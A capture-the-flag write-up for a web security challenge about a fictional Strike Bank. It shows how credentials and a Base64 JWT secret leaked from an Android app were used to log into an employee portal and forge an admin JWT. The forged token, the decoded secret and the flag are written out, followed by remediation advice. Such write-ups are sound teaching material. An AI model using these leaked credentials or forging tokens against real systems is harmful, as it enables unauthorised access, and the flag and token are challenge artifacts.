# 🎫 Ticket

**Category:** Web Security

> Strike Bank recently discovered unusual activity in their customer portal. During a routine review of their Android app, several clues were uncovered. Your mission is to investigate the information available, explore the associated portal, and uncover the hidden flag. Everything you need is already out there!

**BeVigil Report:**
[https://bevigil.com/report/com.strikebank.netbanking](https://bevigil.com/report/com.strikebank.netbanking)

---

## 🔍 Initial Reconnaissance

The challenge provided the **Android package name**:

```
com.strikebank.netbanking
```

It was also mentioned that a **security review was available on BeVigil** using the format:

```
https://bevigil.com/report/<package_name>
```

Reviewing the BeVigil report revealed a summary of multiple security issues, including several **exposed secrets and hardcoded credentials** embedded within the mobile application.

![BeVigil Report](./assets/ticket-issues.png)

---

## 🕵️ Source Code & OSINT Inspection (BeVigil Report)

The BeVigil report exposed the following **critical sensitive information**:

```
encoded_jwt_secret   → c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==
google_api_key       → AIzaSyD3fG5-xyz12345ABCDE67FGHIJKLmnopQR
internal_username    → tuhin1729
internal_password    → 123456
firebase_url         → https://strike-projectx-1993.firebaseio.com
application_url      → http://15.206.47.5.nip.io:8443/index.php
```

---

## 🔍 Key Observation

* ✅ Hardcoded **internal employee credentials** were leaked
* ✅ A **JWT signing secret** was exposed in Base64
* ✅ A **production Firebase database URL** was disclosed
* ✅ These were directly usable without any further exploitation

This confirmed a **full authentication takeover** was possible.

---

## 🧪 Accessing the Employee Portal

Using the leaked portal URL:

```
http://15.206.47.5.nip.io:8443
```

Login was performed using:

```
Username: tuhin1729  
Password: 123456
```

![employee login](./assets/employee-login.png)

---

### ✅ Result

Successful login led to the **Strike Bank Employee Dashboard**.

However, the dashboard contained:

* Only a **login success message**
* A **Logout button**
* No visible access to sensitive data
* No flag displayed

![employee dashboard](./assets/employee-dashboard.png)

At this stage, authentication was confirmed — but **privilege escalation was required**.

---

## 🤔 Rethinking the Authentication Model

Since the report exposed a **JWT secret**, it strongly indicated that:

* The application uses **JWT-based authentication**
* The current session token is **client-controlled**
* If the JWT secret is known → **admin tokens can be forged**

The leaked value:

```
c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==
```

When Base64-decoded, it revealed the **real JWT signing key**.
```
str!k3b4nk@1009%sup3r!s3cr37
```

---

## 🛠️ Exploitation — JWT Token Forging

Using the decoded secret key, a **new JWT token was generated** with:

```json
{
  "username": "admin",
  "role": "admin",
  "iat": 1765011000,
  "exp": 1765097400
}
```

* Token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY1MDExMDAwLCJleHAiOjE3NjUwOTc0MDB9.ygN9eni19lou7qd4RJL0LW9rNZTJM0Q6nNEKvtk6rSw
```

This token was signed using the leaked secret and replaced inside the browser cookies.

---

### ✅ Result

Once the forged **admin JWT token** was injected:

* The session was instantly upgraded to **admin privileges**
* The protected admin endpoint became accessible
* The **flag was immediately revealed in the admin response**

This confirmed a **complete authentication and authorization bypass**.

---

## 🚩 Flag

✅ Successfully retrieved after admin takeover:

```
ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ccf62117a030691b1ac7013fca4fb685}
```

---

## 🛡️ Why This Vulnerability Is Dangerous

This issue enables:

* Full **account takeover**
* **Privilege escalation** to admin
* Complete **backend compromise**
* Unauthorized access to:

  * Employee data
  * Internal banking operations
  * Firebase backend
* Zero brute force required

Severity: **Critical**

---

## ✅ Fix & Remediation

To prevent this class of attack:

* ❌ Never hardcode secrets inside mobile apps
* Rotate all:

  * JWT secrets
  * API keys
  * Internal credentials
* Implement:

  * **Short-lived JWTs**
  * **Server-side token validation**
  * **Role verification on backend**
* Restrict Firebase rules with:

  * Auth-based access control
* Perform **mobile app secret scanning before release**

---

## 🧠 Final Takeaway

This challenge proves that:

> **A single leaked JWT secret is enough to collapse an entire authentication system.**

When secrets are exposed in mobile apps:

* Attackers don’t need exploits
* They don’t need brute force
* They simply **become admin by design**

---

